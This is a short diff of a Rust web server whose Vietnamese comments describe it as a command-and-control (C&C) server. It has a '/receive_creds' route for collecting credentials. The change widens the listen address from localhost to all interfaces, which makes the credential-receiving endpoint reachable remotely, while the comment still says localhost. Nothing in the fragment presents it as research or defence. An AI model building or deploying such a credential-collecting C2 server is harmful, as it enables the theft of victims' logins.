@@ -46,7 +46,7 @@ async fn main() {
         .route("/receive_creds", post(receive_credentials_handler));
 
     // Địa chỉ IP và port mà C&C server sẽ lắng nghe
-    let addr = SocketAddr::from(([127, 0, 0, 1], 3001)); // Lắng nghe trên localhost port 3001
+    let addr = SocketAddr::from(([0, 0, 0, 0], 3001)); // Lắng nghe trên localhost port 3001
     
     // Tạo listener để lắng nghe các kết nối đến địa chỉ đã định
     let listener = match TcpListener::bind(&addr).await {
